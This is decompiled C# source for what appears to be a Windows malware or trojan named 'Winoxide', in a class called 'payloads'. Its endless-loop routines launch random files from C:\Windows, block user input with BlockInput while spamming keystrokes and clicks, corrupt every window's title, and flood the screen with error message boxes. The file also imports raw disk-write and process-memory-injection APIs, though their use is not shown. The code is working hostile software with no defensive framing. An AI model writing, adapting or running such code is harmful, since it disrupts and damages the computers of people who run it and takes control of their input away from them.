using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Winoxide;

internal class payloads
{
	private delegate bool EnumChildProc(IntPtr hWnd, IntPtr lParam);

	public delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);

	public static Random r = new Random();

	public static long MB_ICONERROR = 16L;

	public static long MB_SYSTEMMODAL = 4096L;

	public const uint GENERIC_ALL = 268435456u;

	public const uint FILE_SHARE_READ = 1u;

	public const uint FILE_SHARE_WRITE = 2u;

	public const uint OPEN_EXISTING = 3u;

	private const uint MOUSEEVENTF_LEFTDOWN = 2u;

	private const uint MOUSEEVENTF_LEFTUP = 4u;

	private const uint MOUSEEVENTF_RIGHTDOWN = 8u;

	private const uint MOUSEEVENTF_RIGHTUP = 16u;

	[DllImport("user32.dll")]
	public static extern bool SetCursorPos(int x, int y);

	[DllImport("user32.dll")]
	public static extern bool BlockInput(bool fBlockIt);

	[DllImport("user32.dll")]
	public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, IntPtr dwExtraInfo);

	[DllImport("user32.dll")]
	public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

	[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern int GetWindowTextW(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

	[DllImport("user32.dll")]
	private static extern bool EnumChildWindows(IntPtr hWndParent, EnumChildProc lpEnumFunc, IntPtr lParam);

	[DllImport("user32.dll")]
	private static extern int GetWindowTextLength(IntPtr hWnd);

	[DllImport("user32.dll")]
	private static extern bool IsWindowVisible(IntPtr hWnd);

	[DllImport("user32.dll", CharSet = CharSet.Unicode)]
	private static extern bool SetWindowTextW(IntPtr hWnd, string lpString);

	[DllImport("user32.dll")]
	private static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll")]
	public static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, long uType);

	[DllImport("kernel32.dll")]
	public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

	[DllImport("kernel32.dll")]
	public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32.dll")]
	private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll")]
	private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

	public static void openfiles()
	{
		while (true)
		{
			try
			{
				string[] files = Directory.GetFiles("C:\\Windows", "*.*", SearchOption.AllDirectories);
				Process.Start(files[r.Next(files.Length)]);
			}
			catch
			{
			}
			Thread.Sleep(r.Next(100, 2000));
		}
	}

	[STAThread]
	public static void input_spam()
	{
		int num = 5000;
		while (true)
		{
			BlockInput(fBlockIt: false);
			SendKeys.SendWait("...");
			if (r.Next(2) == 1)
			{
				mouse_event(2u, 0u, 0u, 0u, IntPtr.Zero);
				mouse_event(4u, 0u, 0u, 0u, IntPtr.Zero);
			}
			else
			{
				mouse_event(8u, 0u, 0u, 0u, IntPtr.Zero);
				mouse_event(16u, 0u, 0u, 0u, IntPtr.Zero);
			}
			BlockInput(fBlockIt: true);
			Thread.Sleep(num);
			num = Math.Max(100, num - 250);
		}
	}

	public static void title_change()
	{
		Random rand = new Random();
		StringBuilder buff = new StringBuilder(256);
		int num = 2500;
		while (true)
		{
			EnumChildWindows(GetDesktopWindow(), changetext, IntPtr.Zero);
			if (num > 500)
			{
				num -= 100;
			}
			Thread.Sleep(num);
		}
		bool changetext(IntPtr topHwnd, IntPtr lParam)
		{
			GetWindowTextW(topHwnd, buff, 256);
			string text = buff.ToString();
			if (!string.IsNullOrEmpty(text))
			{
				char[] array = text.ToCharArray();
				int num2 = rand.Next(array.Length);
				array[num2] = '\u0001';
				string lpString = new string(array);
				SetWindowTextW(topHwnd, lpString);
				return true;
			}
			return true;
		}
	}

	public static void msgbox()
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Unknown result type (might be due to invalid IL or missing references)
		//IL_0204: Unknown result type (might be due to invalid IL or missing references)
		//IL_022a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0250: Unknown result type (might be due to invalid IL or missing references)
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_029c: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_030e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0334: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0380: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0418: Unknown result type (might be due to invalid IL or missing references)
		//IL_043e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0464: Unknown result type (might be due to invalid IL or missing references)
		//IL_048a: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0522: Unknown result type (might be due to invalid IL or missing references)
		//IL_0548: Unknown result type (might be due to invalid IL or missing references)
		//IL_056e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0594: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0606: Unknown result type (might be due to invalid IL or missing references)
		//IL_062c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0652: Unknown result type (might be due to invalid IL or missing references)
		//IL_0678: Unknown result type (might be due to invalid IL or missing references)
		//IL_069e: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_0710: Unknown result type (might be due to invalid IL or missing references)
		//IL_0736: Unknown result type (might be due to invalid IL or missing references)
		//IL_075c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0782: Unknown result type (might be due to invalid IL or missing references)
		//IL_07a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_081a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0840: Unknown result type (might be due to invalid IL or missing references)
		//IL_0866: Unknown result type (might be due to invalid IL or missing references)
		//IL_088c: Unknown result type (might be due to invalid IL or missing references)
		//IL_08b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_08d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_08fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0924: Unknown result type (might be due to invalid IL or missing references)
		//IL_094a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0970: Unknown result type (might be due to invalid IL or missing references)
		//IL_0996: Unknown result type (might be due to invalid IL or missing references)
		//IL_09bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_09e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a08: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a2e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a54: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a7a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aec: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b12: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b38: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b5e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b84: Unknown result type (might be due to invalid IL or missing references)
		//IL_0baa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bd0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c1c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c42: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c68: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c8e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cb4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cda: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d00: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d26: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d4c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d72: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d98: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dbe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0de4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e0a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e30: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e56: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e7c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ea2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ec8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f14: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f3a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f60: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f86: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fac: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ff8: Unknown result type (might be due to invalid IL or missing references)
		//IL_101e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1044: Unknown result type (might be due to invalid IL or missing references)
		//IL_106a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1090: Unknown result type (might be due to invalid IL or missing references)
		//IL_10b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_10dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1102: Unknown result type (might be due to invalid IL or missing references)
		//IL_1128: Unknown result type (might be due to invalid IL or missing references)
		//IL_114e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1174: Unknown result type (might be due to invalid IL or missing references)
		//IL_119a: Unknown result type (might be due to invalid IL or missing references)
		//IL_11c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_11e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_120c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1232: Unknown result type (might be due to invalid IL or missing references)
		//IL_1258: Unknown result type (might be due to invalid IL or missing references)
		//IL_127e: Unknown result type (might be due to invalid IL or missing references)
		//IL_12a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_12ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_12f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1316: Unknown result type (might be due to invalid IL or missing references)
		//IL_133c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1362: Unknown result type (might be due to invalid IL or missing references)
		//IL_1388: Unknown result type (might be due to invalid IL or missing references)
		//IL_13ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_13d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_13fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_1420: Unknown result type (might be due to invalid IL or missing references)
		//IL_1446: Unknown result type (might be due to invalid IL or missing references)
		//IL_146c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1492: Unknown result type (might be due to invalid IL or missing references)
		//IL_14b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_14de: Unknown result type (might be due to invalid IL or missing references)
		//IL_1504: Unknown result type (might be due to invalid IL or missing references)
		//IL_152a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1550: Unknown result type (might be due to invalid IL or missing references)
		//IL_1576: Unknown result type (might be due to invalid IL or missing references)
		//IL_159c: Unknown result type (might be due to invalid IL or missing references)
		//IL_15c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_15e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_160e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1634: Unknown result type (might be due to invalid IL or missing references)
		//IL_165a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1680: Unknown result type (might be due to invalid IL or missing references)
		//IL_16a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_16cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_16f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1718: Unknown result type (might be due to invalid IL or missing references)
		//IL_173e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1764: Unknown result type (might be due to invalid IL or missing references)
		//IL_178a: Unknown result type (might be due to invalid IL or missing references)
		//IL_17b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_17d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_17fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1822: Unknown result type (might be due to invalid IL or missing references)
		//IL_1848: Unknown result type (might be due to invalid IL or missing references)
		//IL_186e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1894: Unknown result type (might be due to invalid IL or missing references)
		//IL_18ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_18e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1906: Unknown result type (might be due to invalid IL or missing references)
		//IL_192c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1952: Unknown result type (might be due to invalid IL or missing references)
		//IL_1978: Unknown result type (might be due to invalid IL or missing references)
		//IL_199e: Unknown result type (might be due to invalid IL or missing references)
		//IL_19c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_19ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a10: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a36: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a5c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a82: Unknown result type (might be due to invalid IL or missing references)
		//IL_1aa8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ace: Unknown result type (might be due to invalid IL or missing references)
		//IL_1af4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b40: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b66: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b8c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bb2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bd8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bfe: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c24: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c70: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c96: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cbc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ce2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d08: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d2e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d54: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d7a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1da0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dc6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dec: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e12: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e38: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e5e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e84: Unknown result type (might be due to invalid IL or missing references)
		//IL_1eaa: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ed0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ef6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f1c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f42: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f68: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f8e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fb4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fda: Unknown result type (might be due to invalid IL or missing references)
		//IL_2000: Unknown result type (might be due to invalid IL or missing references)
		//IL_2026: Unknown result type (might be due to invalid IL or missing references)
		//IL_204c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2072: Unknown result type (might be due to invalid IL or missing references)
		//IL_2098: Unknown result type (might be due to invalid IL or missing references)
		//IL_20be: Unknown result type (might be due to invalid IL or missing references)
		//IL_20e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_210a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2130: Unknown result type (might be due to invalid IL or missing references)
		//IL_2156: Unknown result type (might be due to invalid IL or missing references)
		//IL_217c: Unknown result type (might be due to invalid IL or missing references)
		//IL_21a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_21c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_21ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_2214: Unknown result type (might be due to invalid IL or missing references)
		//IL_223a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2260: Unknown result type (might be due to invalid IL or missing references)
		//IL_2286: Unknown result type (might be due to invalid IL or missing references)
		//IL_22ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_22d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_22f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_231e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2344: Unknown result type (might be due to invalid IL or missing references)
		//IL_236a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2390: Unknown result type (might be due to invalid IL or missing references)
		//IL_23b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_23dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_2402: Unknown result type (might be due to invalid IL or missing references)
		//IL_2428: Unknown result type (might be due to invalid IL or missing references)
		//IL_244e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2474: Unknown result type (might be due to invalid IL or missing references)
		//IL_249a: Unknown result type (might be due to invalid IL or missing references)
		//IL_24c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_24e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_250c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2532: Unknown result type (might be due to invalid IL or missing references)
		//IL_2558: Unknown result type (might be due to invalid IL or missing references)
		//IL_257e: Unknown result type (might be due to invalid IL or missing references)
		//IL_25a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_25ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_25f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_2616: Unknown result type (might be due to invalid IL or missing references)
		//IL_263c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2662: Unknown result type (might be due to invalid IL or missing references)
		//IL_2688: Unknown result type (might be due to invalid IL or missing references)
		//IL_26ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_26d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_26fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_2720: Unknown result type (might be due to invalid IL or missing references)
		//IL_2746: Unknown result type (might be due to invalid IL or missing references)
		//IL_276c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2792: Unknown result type (might be due to invalid IL or missing references)
		//IL_27b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_27de: Unknown result type (might be due to invalid IL or missing references)
		//IL_2804: Unknown result type (might be due to invalid IL or missing references)
		//IL_282a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2850: Unknown result type (might be due to invalid IL or missing references)
		//IL_2876: Unknown result type (might be due to invalid IL or missing references)
		//IL_289c: Unknown result type (might be due to invalid IL or missing references)
		//IL_28c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_28e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_290e: Unknown result type (might be due to invalid IL or missing references)
		MessageBoxButtons[] array = (MessageBoxButtons[])(object)new MessageBoxButtons[6]
		{
			default(MessageBoxButtons),
			(MessageBoxButtons)1,
			(MessageBoxButtons)2,
			(MessageBoxButtons)3,
			(MessageBoxButtons)4,
			(MessageBoxButtons)5
		};
		MessageBox.Show(get_unicode(2043333338), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)64);
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
		MessageBox.Show(get_unicode(2048), ".", array[r.Next(array.Length)], (MessageBoxIcon)48);
